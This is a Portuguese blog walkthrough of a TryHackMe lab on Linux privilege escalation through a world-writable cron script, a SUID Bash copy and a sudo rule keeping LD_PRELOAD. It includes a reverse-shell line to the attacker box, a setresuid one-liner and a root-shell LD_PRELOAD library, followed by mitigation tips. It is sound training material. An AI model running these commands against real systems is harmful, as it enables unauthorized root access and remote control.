---
layout: post
title: "Linux Privilege Escalation - Cron, SUID e LD_PRELOAD"
description: "Walkthrough TryHackMe: enumeração no Ubuntu, cron inseguro, Bash SUID, reverse shell e escalação até root com LD_PRELOAD."
date: 2026-10-11
categories: [walkthrough]
tags: [linux, tryhackme, privilege-escalation, cron, pspy, bash, suid, sudo, ld-preload, reverse-shell]
---

# Linux Privilege Escalation - Cron, SUID e LD_PRELOAD

## Introdução

Nesta room do TryHackMe, comecei com acesso ao Ubuntu 24.04.4 LTS como **john**. A escalação aconteceu em duas etapas: **john → frank → root**, explorando configurações inseguras, sem descobrir senhas.

~~~text
AttackBox: 10.66.74.81
Target:    10.66.174.173
~~~

> Laboratório autorizado. Os endereços podem mudar quando a VM é reiniciada.

## Enumeração como john

Transferi ferramentas do AttackBox por HTTP e testei **LinPEAS, LinEnum, Linux Exploit Suggester (LES), Linux Checker e pspy**. As sugestões de CVEs do LES não foram necessárias. A enumeração manual identificou o arquivo mais interessante, e o **pspy confirmou que o cron era executado por frank**.

~~~bash
id
cat /etc/os-release
find /opt /usr/local/bin /home -type f -writable -printf '%p\n' 2>/dev/null
ls -l /opt/scripts/backup.sh
cat /etc/cron.d/frank-backup
cat /opt/scripts/backup.sh
~~~

Descobri que <code>/opt/scripts/backup.sh</code> pertencia a <code>frank</code>, mas tinha permissão **777** (<code>-rwxrwxrwx</code>): qualquer usuário podia modificá-lo.

O cron continha:

~~~cron
* * * * * frank /opt/scripts/backup.sh
~~~

O script original fazia o backup:

~~~bash
#!/bin/bash
tar czf /tmp/backup-$(date +%Y%m%d).tar.gz /home/frank/Documents 2>/dev/null
~~~

A captura relevante do pspy era:

~~~text
UID=1002 /bin/bash /opt/scripts/backup.sh
UID=1002 tar czf /tmp/backup-20261011.tar.gz /home/frank/Documents
~~~

**Conclusão:** o cron executava o script a cada minuto com os privilégios de **frank**, não de root. Como john podia alterá-lo, poderia acrescentar comandos que rodariam como frank.

## john → frank: duas alternativas

Antes, uma boa prática é guardar o script original:

~~~bash
cp /opt/scripts/backup.sh /tmp/backup.sh.original
~~~

### Alternativa A — Reverse shell

No AttackBox, abrir o listener:

~~~bash
nc -lvnp 4444
~~~

No alvo, acrescentar ao script:

~~~bash
cat >> /opt/scripts/backup.sh <<'EOF'
bash -c 'bash -i >& /dev/tcp/10.66.74.81/4444 0>&1'
EOF
~~~

Na execução seguinte, o **Bash** do alvo inicia uma conexão TCP para o listener e entrega uma shell como frank. Não precisamos de um segundo <code>nc</code> no alvo: <code>/dev/tcp</code> é um recurso do Bash.

### Alternativa B — Bash SUID (utilizada)

Em vez de abrir uma conexão, fiz o cron copiar o próprio Bash:

~~~bash
echo 'cp /bin/bash /tmp/frankbash && chmod 4755 /tmp/frankbash' >> /opt/scripts/backup.sh
~~~

Depois de o cron executar:

~~~bash
ls -l /tmp/frankbash
/tmp/frankbash -p
id
~~~

Resultado:

~~~text
uid=1001(john) gid=1001(john) euid=1002(frank)
~~~

**O que é o Bash?** É um programa que interpreta comandos Linux. O arquivo <code>/bin/bash</code> é o executável desse programa — **não é um token nem uma senha**.

**Por que copiar funciona?** O cron cria a cópia como <code>frank</code>. Com <code>chmod 4755</code>, ativamos o **SUID**, que permite executar esse programa com o UID efetivo do proprietário. O <code>-p</code> mantém esse privilégio no Bash. O processo ainda tem UID real de john, mas EUID de frank. O método exige que o sistema de arquivos não esteja montado com <code>nosuid</code>.

Com esses privilégios, li a primeira flag:

~~~bash
cat /home/frank/flag.txt
~~~

~~~text
THM{Frank_Pwned_Privesc}
~~~

## Por que sudo -l ainda mostrava john?

Na shell SUID, <code>sudo -l</code> ainda identificava o usuário **john**. O SUID altera o **EUID** (identidade efetiva), mas não necessariamente o **UID** real, utilizado pelo sudo para identificar o usuário que invoca o comando.

Para assumir o UID real de frank, executei na shell SUID:

~~~bash
python3 -c 'import os; os.setresuid(1002,1002,1002); os.execl("/bin/bash","bash","-i")'
~~~

<code>setresuid()</code> ajusta UIDs real, efetivo e salvo; <code>execl()</code> abre o Bash. O GID continuou de john, pois não foi alterado.

Agora, como frank:

~~~bash
id
sudo -l
~~~

Descobri duas regras importantes:

~~~text
env_keep+=LD_PRELOAD
(root) NOPASSWD: /usr/bin/id
~~~

Frank podia executar <code>/usr/bin/id</code> como root sem senha, e o sudo preservava a variável de ambiente <code>LD_PRELOAD</code>.

## frank → root com LD_PRELOAD

**LD_PRELOAD** informa ao carregador dinâmico quais bibliotecas compartilhadas (<code>.so</code>) carregar antes de iniciar normalmente um executável. Se o sudo permite preservar essa variável, uma biblioteca controlada pelo usuário pode executar código dentro de um processo privilegiado.

Criei uma biblioteca C:

~~~bash
cat > /tmp/root.c <<'EOF'
#include <unistd.h>
#include <stdlib.h>

__attribute__((constructor))
static void start(void) {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    execl("/bin/bash", "bash", "-p", (char *)NULL);
}
EOF
~~~

O atributo <code>constructor</code> executa a função ao carregar a biblioteca; <code>unsetenv</code> evita carregamentos repetidos; <code>setuid(0)</code> e <code>setgid(0)</code> definem root; <code>execl()</code> abre a shell.

Compilei e executei usando o comando autorizado no sudo:

~~~bash
gcc -fPIC -shared -o /tmp/root.so /tmp/root.c
sudo LD_PRELOAD=/tmp/root.so /usr/bin/id
id
cat /root/flag.txt
~~~

Resultado:

~~~text
uid=0(root) gid=0(root) groups=0(root)
THM{Priv_Ch@l_D0ne}
~~~

**Root obtido.** O problema não é o programa <code>id</code>, e sim permitir que um executável iniciado como root carregue uma biblioteca controlada por frank.

## Por que não trocar a senha de frank?

Nossa escalação explorou **permissões de execução**, não credenciais. O comando <code>passwd</code> normalmente exige a senha atual quando executado pelo próprio usuário; <code>chpasswd</code> exige privilégios de root para alterar senhas diretamente. Como já conseguíamos executar comandos como frank, trocar a senha seria desnecessário.

## Comandos, operadores e conceitos

| Item | Explicação |
|---|---|
| UID / EUID | Identidade real / efetiva do processo |
| GID | Identificador do grupo |
| SUID | Executa um programa com o EUID do dono do arquivo |
| <code>chmod +x</code> | Adiciona permissão de execução; não concede root |
| <code>chmod 4755</code> | Ativa SUID e define permissões 755 |
| <code>bash -p</code> | Preserva privilégios efetivos do Bash |
| <code>sudo -l</code> | Consulta permissões no sudoers |
| <code>LD_PRELOAD</code> | Pré-carrega bibliotecas compartilhadas |
| <code>gcc -fPIC -shared</code> | Compila uma biblioteca compartilhada |
| <code>>></code> | Acrescenta conteúdo ao final do arquivo |
| <code>&&</code> | Executa o próximo comando somente se o anterior funcionar |
| <code>2>/dev/null</code> | Oculta mensagens de erro |
| <code>find ... -printf '%p\n'</code> | Mostra somente os caminhos encontrados |

## Dicas e mitigação

- **Enumeração:** investigue primeiro scripts graváveis, crons e processos. As sugestões do LES não comprovaram exploração; o pspy ajudou a confirmar o processo executado por frank.
- **SUID:** diferencie UID real de EUID. Esse detalhe explicou por que <code>sudo -l</code> ainda identificava john.
- **Menor privilégio:** remova permissão de escrita pública de scripts agendados e revise seus proprietários; um script protegido por <code>root:root</code> com permissão <code>755</code> pode continuar legível e executável por frank sem ser modificável por usuários comuns.
- **sudoers:** não preserve <code>LD_PRELOAD</code>; revise permissões <code>NOPASSWD</code> e mantenha o ambiente do sudo restrito.
- **Limpeza:** restaure o script de backup e remova artefatos temporários ao concluir testes autorizados.

### Referências

- [PEASS-ng / LinPEAS](https://github.com/peass-ng/PEASS-ng)
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)
- [pspy](https://github.com/DominicBreuker/pspy)
- [GTFOBins: Bash](https://gtfobins.github.io/gtfobins/bash/)
- [sudoers: manual](https://www.sudo.ws/docs/man/sudoers.man/)

## Conclusão

~~~text
john
  ↓ script de backup gravável executado por cron
frank (reverse shell ou Bash SUID)
  ↓ sudo preservando LD_PRELOAD
root
~~~

A room reforçou o mais importante da escalação Linux: descobrir **o que posso modificar**, **quem executa esse arquivo** e **quais privilégios esse processo recebe**.
